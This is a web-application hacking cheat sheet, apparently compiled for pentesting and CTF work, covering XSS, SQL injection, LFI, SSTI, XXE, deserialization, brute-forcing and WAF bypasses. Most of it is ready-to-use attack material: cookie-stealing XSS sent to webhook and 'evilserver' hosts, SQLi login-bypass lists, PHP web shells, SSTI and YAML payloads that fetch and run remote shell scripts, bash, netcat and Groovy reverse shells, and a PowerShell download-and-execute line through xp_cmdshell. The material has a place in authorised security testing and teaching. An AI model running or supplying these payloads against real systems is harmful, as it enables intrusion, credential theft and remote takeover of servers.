# Web Hacking

## Resources

https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration  
https://pentester.land/cheatsheets/2018/11/14/subdomains-enumeration-cheatsheet.html  
https://github.com/EdOverflow/can-i-take-over-xyz#all-entries  
https://highon.coffee/blog/lfi-cheat-sheet/  
https://saadahmedx.medium.com/weaponizing-xss-for-fun-profit-a1414f3fcee9  
https://github.com/swisskyrepo/PayloadsAllTheThings  
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf  
https://github.com/Ignitetechnologies/Web-Application-Cheatsheet  
https://0x00sec.org/t/execute-system-commands-in-python-reference/7870  
https://github.com/almandin/fuxploider  

### CTF resources
https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Exploiting%20Improper%20Redirection%20in%20PHP%20Web%20Applications.pdf  
https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20HTTP%20basic%20authentication%20and%20digest%20authentication.pdf  
https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20OWASP%20testing%20guide%20v4.pdf  
https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20HTTP%20request%20smuggling.pdf  
https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Secure%20file%20upload%20in%20PHP%20web%20applications.pdf  

### The Burp Methodology
https://portswigger.net/support/the-burp-methodology  

### Javascript
```
document.getElementById
document.getElementByClassName
document.getElementsByName
document.getElementsByTagName
document.getElementsByTagNameNS

var variablename document.getElementByIdTagName("tagName").innerHTML = "-confirm(1)-"
var variablename document.getElementsByIdTagName("tagName")[0].innerHTML = "-confirm(1)-"

document.getElementById('thm-title').innerHTML = "Insert Code"
document.querySelector('#thm-title').innerHTML = "Insert Code"
document.querySelectorAll('#thm-title')
document.querySelectorAll('#thm-title').length
document.querySelectorAll('#thm-title')[0]
document.querySelectorAll('#thm-title')[0].baseURI
document.querySelectorAll('#thm-title')[0].innerHTML
document.querySelectorAll('#thm-title')[0].innerHTML = "Insert Code"
document.querySelectorAll('#thm-title')[0].innerText
document.querySelectorAll('#thm-title')[0].innerText = "Insert Code"
```

### Testing XSS using webhooks (Thanks to @iiLegacyyii) and also tryhackme examples taken from https://tryhackme.com/room/xss

Generate your webhook session id by using https://webhook.site/
```
<script>document.location = "https://webhook.site/session_id"</script>
<script>document.location = "https://webhook.site/session_id/?cookies=" + document.cookie</script>

Tryhackme examples
<script>window.location='http://evilserver/log/sessid='+document.cookie</script>
<script>document.getElementById("thm-title").innerHTML = "test";</script>
<script>alert(window.location.hostname)</script>
```

### jQuery 2.1.1
```
$.get('http://example.com/jquerypayload')
$.post('http://example.com/jquerypayload')
$.parseHTML("<img src='​http://example.com/logo_jquery_215x53.gif'>")
$.parseHTML("<img src='z' onerror='alert(\"xss\")'>")

jquerypayload
alert(document.domain);
```

### Creating Requests
```
var xhttp = new XMLHttpRequest();
xhttp.open('GET', 'URL' + document.cookie, true);
xhttp.send();
```

Thanks to @Legacyy for assisting me with the javascript breakdown

https://kapeli.com/cheat_sheets/Axios.docset/Contents/Resources/Documents/index

### XSS
Resources:

https://joecmarshall.com/posts/burp-suite-extensions-xss-validator/

https://portswigger.net/support/xss-beating-html-sanitizing-filters

https://xsshunter.com/app

https://owasp.org/www-community/xss-filter-evasion-cheatsheet

### XSS Payloads
https://github.com/payloadbox/xss-payload-list

https://github.com/pgaijin66/XSS-Payloads

### bugbountyhunting
https://www.bugbountyhunting.com/

### DOM xss in angularJS (Example from portswigger)

```
angular_1-7-7.js
{{$on.constructor('alert(document.domain)')()}}
```

Great XSS example from bugbountyhunting  
```
x = %09, %20, %0d

xjavascript:alert(1) 
javaScriptx:alert(1) 
xjavascriptx:alert(1) 
javaxscript:alert(1) 

<script>eval(atob("base64xsspayload"));</script>
```

### DOM Based XSS

The following few examples below was taken from the links below. These were great examples that helped me better understand the nature of DOM based XSS.

https://owasp.org/www-community/attacks/DOM_Based_XSS  
https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html  

```
http://<domain>/page.html?default=<script>alert(document.cookie)</script>
http://<domain>/page.html#default=<script>alert(document.cookie)</script>
http://<domain>/document.pdf#somename=javascript:script
```

Examples of Encoded DOM XSS payloads

```
 for(var \u0062=0; \u0062 < 10; \u0062++){
     \u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074
     .\u0077\u0072\u0069\u0074\u0065\u006c\u006e
     ("\u0048\u0065\u006c\u006c\u006f\u0020\u0057\u006f\u0072\u006c\u0064");
 }
 \u0077\u0069\u006e\u0064\u006f\u0077
 .\u0065\u0076\u0061\u006c
 \u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074
 .\u0077\u0072\u0069\u0074\u0065(111111111);
 ```

```
var s = "\u0065\u0076\u0061\u006c";
 var t = "\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029";
 window[s](t);
```

## Port scanning web server
```
nmap -sC -sV -v -p- IP
nmap -sC -sV -v -p- IP --min-rate=10000
```

## Fuzzing Websites
https://github.com/ffuf/ffuf

```
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL/FUZZ -fc 403,404,302

To filter by size
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL/FUZZ -fc 403,404,302 -fs 1000

ffuf -u http://example.com/FUZZ -e asp,html,jpg -recursion -recursion-depth 2 -w wordlist.txt
```
### Fuzzing Resources
https://github.com/chrislockard/api_wordlist/blob/master/common_paths.txt

## Subdomain Scraping
https://github.com/OWASP/Amass
```
amass enum -v -src -ip -brute -min-for-recursive 2 -o domain_list.txt -d $domain
```

### Cleaning domain list (thanks to @dee-see) for assisting on this!
```
awk '{print $2}' $1
```

### Probing domains
https://github.com/tomnomnom/httprobe
```
cat domain_list | httprobe > http_domain_list
```

### Screenshots
https://github.com/FortyNorthSecurity/EyeWitness
```
python3 /path/to/EyeWitness.py -f $1
```

### Web Crawling
https://github.com/jaeles-project/gospider

https://github.com/hakluke/hakrawler

```
gospider -S domain_list.txt --depth 2 --no-redirect -t 50 -c 3 -o gospiderdump
```

### Fuzzing Params
https://github.com/s0md3v/Arjun

https://github.com/maK-/parameth

```
arjun.py -u $url -t 10 --get --post
```

### Domain History
https://github.com/tomnomnom/waybackurls

### findings new domains using amass
https://danielmiessler.com/study/amass/

```
amass intel -ip -cidr $1
```

### capturing basic auth
```
1. sudo msfdb run
2. use auxiliary/server/capture/http_basic
3. set URIPATH abc
4. run
```

### Python secured webserver
```
https://support.microfocus.com/kb/doc.php?id=7013103

openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 -keyout key.pem -out cert.pem
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
```

```python
import BaseHTTPServer, SimpleHTTPServer
import ssl


httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443),
        SimpleHTTPServer.SimpleHTTPRequestHandler)

httpd.socket = ssl.wrap_socket (httpd.socket,
        keyfile="/path/to/key.pem",
        certfile='/path/to/cert.pem', server_side=True)

httpd.serve_forever()
```

### lfi
https://github.com/payloadbox/rfi-lfi-payload-list  
https://github.com/p0cl4bs/kadimus  
https://github.com/mzfr/liffy  

```
param=file:///etc/passwd
param=php://filter/read=convert.base64-encode/resource=../../../../file/to/read
param=php://filter/read=string.rot13/resource=../../../file/to/read
```

### sqli
https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
```
Auth bypass
'or''='
account’-- -
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
'ad'||'min'

ippsec example (Writing files to disk)
X' union select "<?php SYSTEM($_REQUEST['cmd']); ?>" INTO OUTFILE '/var/www/html/x.php'-- -
```

### Bruteforcing
https://github.com/frizb/Hydra-Cheatsheet  

`hydra -l <USERNAME> -P <PASSLIST> <IP> -V http-form-post '<URI>:<DATA>:<FilterExpectedFormResponse>'`

```
hydra -l admin -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
hydra -l none -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
hydra -l admin -P rockyou.txt -t -s 443 -f <IP> http-get /
hydra -l <USERID> -P rockyou.txt <IP> -s <PORT> http-post-form "/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Authentication failed:H=Content-Type\: application/json" -t 64
Example: Basic auth for tomcat
hydra -l tomcat -P passfile.txt -t -s 443 -f <IP> http-get /manager/html -s 8080
```

### php payloads
```
<?php system($_REQUEST["cmd"]); ?>
<?php system($_GET['cmd']);?>
```

### bypassing php functions (Thanks to @dee-see and @kargha for recommending).

Resources:  
https://stackoverflow.com/questions/732832/php-exec-vs-system-vs-passthru 
https://stackoverflow.com/questions/3115559/exploitable-php-functions  
https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass

table taken from the above stackoverflow thread. This was extremely useful.

```
+----------------+-----------------+----------------+----------------+
|    Command     | Displays Output | Can Get Output | Gets Exit Code |
+----------------+-----------------+----------------+----------------+
| system()       | Yes (as text)   | Last line only | Yes            |
| passthru()     | Yes (raw)       | No             | Yes            |
| exec()         | No              | Yes (array)    | Yes            |
| shell_exec()   | No              | Yes (string)   | No             |
| backticks (``) | No              | Yes (string)   | No             |
+----------------+-----------------+----------------+----------------+
```

```
<?php echo "abcdef"; ?>
<?php echo `test`; ?>
<?php include("http://x/reverse_shell.php"); ?>
<?php include_once("http://x/reverse_shell.php"); ?>
<?php `curl "http://x"` ?>
<?php system("id");?>
<?php passthru("whoami");?>
<?php exec("/bin/ls /");?>
<?php shell_exec("whoami");?>
```

### param tampers
```
query?param=/legit/path/to/file.php/../../../../etc/passwd
```

### curl fiddling
```
curl -v -A "Mozilla Chrome Safari" -H 'host: $vhost' -k -X GET $host
curl -v -A "Mozilla Chrome Safari" -H 'host: $vhost' -k -X GET $host
```

### hashcat example hashes
https://hashcat.net/wiki/doku.php?id=example_hashes
```
hashcat -m <mode> -a 0 hashlist.txt /root/wordlist/rockyou.txt
```

### data wrappers
```
data:text/plain,This is a test
data:test/plain,<?php echo shell_exec("whoami") ?>
```
### resources
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/exploiting-password-recovery-functionalities/  

### Pen Testing Password Resets
https://0xayub.gitbook.io/blog/

### file upload bypass
https://book.hacktricks.xyz/pentesting-web/file-upload

### creating an image php payload (rename x.php to x.png,x.jpg etc). You may need to use magic bytes.
```
<?php system($_REQUEST["cmd"]); ?>
```
https://en.wikipedia.org/wiki/List_of_file_signatures

### LateX injection
https://0day.work/hacking-with-latex/  
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection  

### Server Sided Template Injection
https://blog.cobalt.io/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68  
https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf  
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection  
http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine  

```
{% import os %}{{ os.popen("cat /etc/passwd").read() }}

Thanks to Legacyy for the recommended curl command
{% import os %}{{ os.popen("curl <IP>/shell.sh | bash").read() }}

Contents of shell.sh 
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1

{{self.__dict__}}
{{config.items()}}
{{request.url}}

Executing SSTI as fragments using variables:
{{%set a=cycler%}}
{{%set b=a.__init__%}}
{{%set c=b.globals__%}}

Executing SSTI as a list:
{"verb":["{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"],"noun":"test","adjective":"test","person":"test","place":"test"}
```


### Python Pickling
https://medium.com/@shibinbshaji007/using-pythons-pickling-to-explain-insecure-deserialization-5837d2328466  
https://www.youtube.com/watch?v=HsZWFMKsM08  
https://root4loot.com/post/exploiting_cpickle/  
```
import pickle

variable = { "test" : "Test2" , "Test3" : "Test4" }

pickle.dumps(variable)
"(dp0\nS'test'\np1\nS'Test2'\np2\nsS'Test3'\np3\nS'Test4'\np4\ns."

pickle.loads("(dp0\nS'test'\np1\nS'Test2'\np2\nsS'Test3'\np3\nS'Test4'\np4\ns.")
{'test': 'Test2', 'Test3': 'Test4'}
```

### java deserialization
https://portswigger.net/web-security/deserialization

### XXE

Resources:  
https://www.youtube.com/watch?v=aQFG-97f900

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<fieldname><productId>&xxe;</productId></fieldname>

--------------------------

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<root>
<field1>
</field1>
<field2>
</field2>
<field3>
&xxe;
</field3>
</root>

More examples

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>
	<table_num>2</table_num>
	<food>&test;</food>
</root>

More examples 

<?xml  version="1.0" encoding="UFT-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/var/www/html/admin_config.php"> ]>
		<admin>
		<head>test</head>
		<template>&xxe;</template>
		<body>test</body>
		<description>test</description>
		</admin>
```

### xss via file upload
https://medium.com/@lucideus/xss-via-file-upload-lucideus-research-eee5526ec5e2

### Jenkins
https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6  

```powershell
command 1:
String host=”LHOST”;
int port=LPORT;
String cmd=”cmd.exe”;
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

command2:
def cmd = "ls".execute();
println("${cmd.text}");
```

### Node JS Exploit
https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/  

> To learn more about Node JS navigate to https://www.youtube.com/watch?v=W6NZfCO5SIk, thanks to frostb1te for providing the link.

### NodeJS deserialization RCE Exploit
https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf  
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/  

```
_$$ND_FUNC$$_require('child_process').exec('<COMMAND_HERE>', function(error, stdout, stderr) { console.log(stdout) })
```

### Serializing a NodeJS payload
```python
var y = {
rce : function(){
require('child_process').exec('<COMMAND_HERE>', function(error,
stdout, stderr) { console.log(stdout) });
},
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

### IFS Technique to replace spaces
```
<img src=http://localhost/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'<LHOST>'$IFS'<LPORT>')>
```

### SQLi create webshell (Submitted by @Legacyy)
```
SELECT ("<?php echo system($_GET['cmd']); ?>") INTO OUTFILE "/var/www/html/payload.php"
```

### SQL injection using information_schema
```
SELECT * FROM information_schema.tables;
SELECT * FROM information_schema.columns;
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns

' UNION SELECT 1,2,3 FROM information_schema.tables;-- - asd
' UNION SELECT 1,2,CONCAT(TABLE_NAME) FROM information_schema.tables;-- - asd
' UNION SELECT 1,2,CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE TABLE_NAME='user';-- - asd
' UNION SELECT 1,2,CONCAT(username,pwd) FROM users;-- - asd

Changing to different table names using OFFSET instead of WHERE. Thanks to @iiLegacyyii for this information!
SELECT CONCAT(TABLE_NAME) FROM information_schema.tables LIMIT 1 OFFSET 1
```

### sqli on sqlite
https://www.exploit-db.com/docs/english/41397-injecting-sqlite-database-based-applications.pdf

### Testing sql injection using sqlfiddle
http://sqlfiddle.com/

### LDAP Injection
https://book.hacktricks.xyz/pentesting-web/ldap-injection#special-blind-ldap-injection-without

### jetdirect printer service
https://github.com/RUB-NDS/PRET  
https://www.nds.ruhr-uni-bochum.de/media/ei/arbeiten/2017/01/30/exploiting-printers.pdf  

### Bypassing 403 Forbidden Errors (Resource: https://hackerone.com/reports/991717)
```
curl -H "Content-Length:0" -X POST https://<domain>/restricted_file
```

### BruteForcing Wordpress

```
wpscan -U <username> -P wordlist.txt --url http://url/wordpress
```

### pentesting wordpress
https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress

```
use exploit/unix/webapp/wp_admin_shell_upload
use exploit/unix/webapp/wp_slideshowgallery_upload
```

### Uploading malicious plugin for Wordpress
```
Path to the malicious plugin
/usr/share/SecLists/Web-Shells/WordPress/plugin-shell.php

Packing your plugin
zip plugin-shell.zip plugin-shell.php
```

### Using xp_cmdshell to run a powershell script on MSSQL (thanks to @sinfulz for recommending this)

```
xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring("http://<IP>/powershellscript.ps1")
```

### Adobe Cold Fusion
https://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf

### Retrieving password configuration from Cold Fusion 8
```
Retrieving the credentials from the coldfusion configuration file.
/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

### Exploiting Cold Fusion 8 (Authenticated)

```
1. Login to Cold Fusion.
2. Create a scheduled task under Debugging and Logging.
3. Provide Task Name
4. Create your jsp payload msvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.30 lport=32115 -f raw > x.jsp
5. URL enter your http server with the malicious reverse_tcp jsp http://x.x.x.x/x.jsp
6. username and password of cold fusion account.
7. check publish (Save output to a file)
8. File should be your outdirectory C:\ColdFusion8\wwwroot\CFIDE\x.jsp
9. Run your scheduled task
10. Setup your netcat listener nc -nvlp 32115
11. Navigate to http://targetsite/CFIDE/x.jsp execute your reverse_tcp
```

### Using cewl to generate wordlists
https://tools.kali.org/password-attacks/cewl

```
cewl -w wordlist.txt -d 2 -m <IP_ADDRESS>
```

### Docker shell
```
docker -H <IP>:<PORT> exec -it <container> /bin/bash

docker -H <IP>:<PORT> run -v /:/mnt --rm -it alpine:<version> chroot /mnt sh
docker -H <IP>:<PORT> run -v /:/mnt --rm -it alpine:<version> chroot /mnt /bin/bash
```

### Docker Cheatsheet
https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Docker_Security_Cheat_Sheet.md

### Unicode Cheatsheet thanks to @dee-see for suggesting the link
https://gosecure.github.io/unicode-pentester-cheatsheet/

### LFI to RCE log poisoning (Recommended by 5h4d3)

https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d  
https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1  

### webasm based CTF

1. Intercept the webasm page (easiest method is using your browser debugging tool).  
2. Capture the webasm data using wget `wget "http://ctfchallenge/aD8SvhyVkb"`  
3. I then extracted what appears to be a sequence of characters and numbers that looks different than the asm data. For example, in this picoctf I had found `+xakgK\Nsl<8?nmi:<i;0j9:;?nm8i=0??:=njn=9u`.  
4. Using Cyberchef, you can use the magic feature to retrieve the flag `XOR({'option':'Hex','string':'8'},'Standard',false)`.  

### php object injection
A great writeup on picoctf super serial  
https://github.com/JeffersonDing/CTF/tree/master/pico_CTF_2021/web/super_serial  

#### index.phps shows the source code of the page. We are able to confirm that `login` is the cookie header name.  The cookie is then base64 encoded and then url encoded for the payload and assigned to the end user. The cookie header works when you visit `authentication.php`

```php
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```

#### Vulnerable Code

```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
} else {
	$msg = "Welcome guest";
}
?>
```

#### payload

`O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}`

`TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9`

### NodeRed Exploit (Authenticated)
https://csenox.github.io/hackthebox-linux/2020/10/07/HTB-Reddish/  
https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/  

After getting foothold stabilize your connection by reverse tcp via bash:

```
bash -c 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1'
```

### Zen Cart RCE (Authenticated)
https://github.com/MucahitSaratar/zencart_auth_rce_poc  

### gdbserver exploit (Thanks to @iiLegacyyii for recommending this)
```
using localized gdb

target extended-remote ip:port
set remote exec-file /bin/bash
r
b *main
call system("<command exec>")
```

### common open-redirect param names
https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Understanding%20and%20Discovering%20Open%20Redirect%20Vulnerabilities%20-%20Trustwave.pdf

```
RelayState 
ReturnUrl 
RedirectUri
Return
Return_url
Redirect
Redirect_uri
Redirect_url
RedirectUrl
Forward
ForwardUrl
Forward_URL
SuccessUrl
Redir
Exit_url
Destination
Url
relayState 
returnUrl 
redirectUri
return
return_url
redirect
redirect_uri
redirect_url
redirectUrl
forward
forwardUrl
forward_URL
successUrl
redir
exit_url
destination
url
```

## WAF bypass techniques (Great examples taken from the following link: https://github.com/0xInfection/Awesome-WAF#how-wafs-work).  Awsome breakdown provided in the Awesome-WAF repository.

`%09`  
`%0d`  
`%00`  
`%20`  
`\`  

#### Case Toggling
`<ScRipT>alert()</sCRipT>`

#### url encoding
`%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e`

#### url encoding + Case Toggling
`uNIoN%28sEleCT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%29`

#### Unicode
`<marquee onstart=\u0070r\u06f\u006dpt()>`

Alternative Unicode

`/?redir=http://google。com`

`＜marquee loop＝1 onfinish＝alert︵1)>x`

`%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd`

#### HTML

`&quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;`  
`&#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;`  

#### Commenting
`<!--><script>alert/**/()/**/</script>`

`/?id=1+un/**/ion+sel/**/ect+1,2,3--`

### joomla sqli for 3.7
https://www.hackingarticles.in/dc-3-walkthrough/

```
sqlmap -u "http://<ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla --tables --batch

sqlmap -u "http://<ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' -C name,password --dump --batch
```

### pentesting apex
https://www.neooug.org/gloc/Presentations/2018/SpendoliniHacking%20Oracle%20APEX.pdf

### Safely testing for Palo Alto Global Protect Preauth RCE / DoS
http://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html

```
time curl -s -d 'scep-profile-name=%9999999c' https://localhost/sslmgr >/dev/null
time curl -s -d 'scep-profile-name=%99999999c' https://localhost/sslmgr >/dev/null
time curl -s -d 'scep-profile-name=%999999999c' https://localhost/sslmgr >/dev/null
```

### YAML Deserialization Attack (Thanks to @felamos)

Testing a poc
```
!!javax.script.ScriptEngineManager [
 !!java.net.URLClassLoader [[
 !!java.net.URL ["http://<attackerip>"]
 ]]
]
```

Generating a payload

payload.jar

```
 public AwesomeScriptEngineFactory() throws Exception {
 try {
 Process p = Runtime.getRuntime().exec("wget <LHOST>/revshell.sh -O /tmp/revshell");
 p.waitFor();
 p = Runtime.getRuntime().exec("chmod +x /tmp/revshell");
 p.waitFor();
 p = Runtime.getRuntime().exec("/tmp/revshell");
 p.waitFor();
 } catch (IOException e) {
 e.printStackTrace();
 }
 }
 ```
 
 Compiling your payload using java  
 https://github.com/artsploit/yaml-payload
 
```
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf payload.jar -C src/ .
```

Executing your yaml payload

```
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://<attackerip>/payload.jar"]
  ]]
]
```

### graphql
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/GraphQL%20Injection  
https://jsonformatter.org/json-pretty-print  

### S3 Bucket creation documentation for bucket takeovers
https://docs.aws.amazon.com/AmazonS3/latest/userguide/create-bucket-overview.html

### Server Sided Request Forgery
https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf

internal networks or internal ports
```
https://127.0.0.1:5555
https://169.254.169.254
file://127.0.0.1
https://realdomain/?resource=https://realdomain.evildomain:5555/secret.txt
```

### csv injection
https://www.veracode.com/blog/secure-development/data-extraction-command-execution-csv-injection

```
=MSEXCEL|'\..\..\..\Windows\System32\cmd.exe /c calc.exe'!''
=WEBSERVICE("http://evildomain.tld/payload.txt")
='file://etc/passwd'#$passwd.A1
```

### Upper and Lower case
https://eng.getwisdom.io/hacking-github-with-unicode-dotless-i/

```
Uppercase
Char	Code Point	Output Char
ß	0x00DF	SS
ı	0x0131	I
ſ	0x017F	S
ﬀ	0xFB00	FF
ﬁ	0xFB01	FI
ﬂ	0xFB02	FL
ﬃ	0xFB03	FFI
ﬄ	0xFB04	FFL
ﬅ	0xFB05	ST
ﬆ	0xFB06	ST
Lowercase
Char	Code Point	Output Char
K	0x212A	k
```

### Using git dumper to enumerate git content
https://github.com/arthaud/git-dumper

```
git-dumper {url}/.git outdir/
```
